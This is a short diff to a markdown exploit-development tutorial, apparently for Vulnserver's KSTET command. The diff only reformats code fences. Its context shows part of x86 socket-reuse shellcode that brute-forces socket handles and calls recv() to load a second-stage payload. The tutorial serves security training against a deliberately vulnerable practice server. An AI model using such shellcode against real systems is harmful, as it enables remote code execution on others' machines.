@@ -365,7 +365,8 @@ Due to the limited space on the stack we have to work with (66-bytes) we will be
 
 		* The File Descriptor used for the socket can also be extracted. However, this is essentially a random number from call to call, so we cannot rely on it from exploit to exploit. So, the Socket Handle information is not that useful in this case.
 4. We will generate shellcode from the following shell code provided in the fluid attacks [blog](https://fluidattacks.com/blog/vulnserver-kstet/).
-	```
+
+```
 	sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
 							; overwriting our shellcode
 	xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
@@ -388,7 +389,7 @@ socket_loop:            ; Brute Force Loop Label
 	test eax,eax            ; Check if our recv() call was successfully made
 	jnz socket_loop         ; If recv() failed, jump back to the socket loop where
 							; EDI will be increased to check the next socket handle
-	```
+```
 
 ```
          |----------------------------------|
